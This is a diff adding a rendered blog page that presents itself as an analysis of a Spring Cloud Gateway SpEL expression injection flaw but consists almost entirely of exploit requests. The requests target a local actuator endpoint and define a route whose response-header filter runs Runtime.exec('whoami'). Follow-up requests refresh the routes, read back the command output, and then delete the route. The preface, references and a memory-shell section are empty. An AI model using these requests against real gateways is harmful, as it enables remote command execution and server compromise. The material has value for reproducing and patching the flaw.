@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=9bd5ca801b57208805a649cd598388a48ca56336">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SpringBoot GatewayEL表达式漏洞分析 | BlogPapers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="SpringBoot GatewayEL表达式漏洞分析" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:4000/2022/SpringBoot%20Gateway%20EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/2022/SpringBoot%20Gateway%20EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" />
+<meta property="og:site_name" content="BlogPapers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SpringBoot GatewayEL表达式漏洞分析" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"SpringBoot GatewayEL表达式漏洞分析","url":"http://0.0.0.0:4000/2022/SpringBoot%20Gateway%20EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>BlogPapers</h1>
+        </a>
+        <h2><a href="sumsec.me"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=24&pause=1000&color=FDFDFD&background=13797800&center=true&vCenter=true&width=435&lines=%F0%9F%91%8B%EF%BC%8C%E5%83%8F%E6%B8%85%E6%B0%B4%E4%B8%80%E8%88%AC%E6%B8%85%E6%BE%88%E9%80%8F%E6%98%8E" alt="SummerSec" /></a></h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/SummerSec/BlogPapers" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h2 id="springboot-gatewayel表达式漏洞分析">SpringBoot GatewayEL表达式漏洞分析</h2>
+
+<h3 id="前言">前言</h3>
+
+<hr />
+
+<h3 id="漏洞复现">漏洞复现</h3>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/actuator/gateway/routes/hacktest</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8090</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">368</span>
+
+<span class="p">{</span><span class="w">
+      </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hacktest"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"filters"</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span><span class="w">
+        </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AddResponseHeader"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"args"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Result"</span><span class="p">,</span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String(</span><span class="se">\"</span><span class="s2">whoami</span><span class="se">\"</span><span class="s2">)).getInputStream()))}"</span><span class="p">}</span><span class="w">
+        </span><span class="p">}],</span><span class="w">
+      </span><span class="nl">"uri"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://example.com"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"order"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="https://img.sumsec.me//2022/03/48u5248ec48u5248ec.png" alt="image-20220417165248745" /></p>
+
+<hr />
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/actuator/gateway/refresh</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8090</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+
+
+</code></pre></div></div>
+
+<p><img src="https://img.sumsec.me//2022/03/36u5236ec36u5236ec.png" alt="image-20220417165229679" /></p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/actuator/gateway/routes/hacktest</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8090</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+
+
+</code></pre></div></div>
+
+<p><img src="https://img.sumsec.me//2022/03/55u055ec55u055ec.png" alt="image-20220417170055653" /></p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">DELETE</span> <span class="nn">/actuator/gateway/routes/hacktest</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8090</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+
+
+</code></pre></div></div>
+
+<p><img src="https://img.sumsec.me//2022/03/16u5316ec16u5316ec.png" alt="image-20220417165316424" /></p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/actuator/gateway/refresh</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:8090</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+
+
+</code></pre></div></div>
+
+<p><img src="https://img.sumsec.me//2022/03/24u5324ec24u5324ec.png" alt="image-20220417165324564" /></p>
+
+<hr />
+
+<p>内存马：</p>
+
+<h3 id="参考">参考</h3>
+
+
+      </section>
+    </div>
+  </body>
+</html>
